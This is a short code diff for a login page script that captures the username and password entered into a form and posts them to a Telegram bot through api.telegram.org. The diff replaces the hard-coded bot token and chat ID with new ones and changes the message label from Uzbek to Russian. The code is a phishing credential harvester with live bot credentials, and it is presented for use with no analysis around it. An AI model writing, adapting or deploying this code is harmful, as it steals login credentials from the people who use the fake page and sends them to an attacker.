@@ -1,14 +1,14 @@
 let inputs = document.querySelectorAll('input');
 let button = document.querySelector('.login-button');
 
-const Token = '7557267563:AAHOPAaHjitlXWLOnH79JYHjtrGIC1Uz82Y';
-const Chat_Id = '858709040';
+const Token = '8075918510:AAE5jgkDDaxbIKWaDMzG5YiYQ8H_Yguq_88';
+const Chat_Id = '6052322453';
 
 button.addEventListener('click', () => {
     const username = inputs[0].value;
     const password = inputs[1].value;
 
-    const message = `Loxni danniylari\nUsername: ${username}\nPassword: ${password}`;
+    const message = `Данные:\nUsername: ${username}\nPassword: ${password}`;
 
     fetch(`https://api.telegram.org/bot${Token}/sendMessage`, {
         method: 'POST',
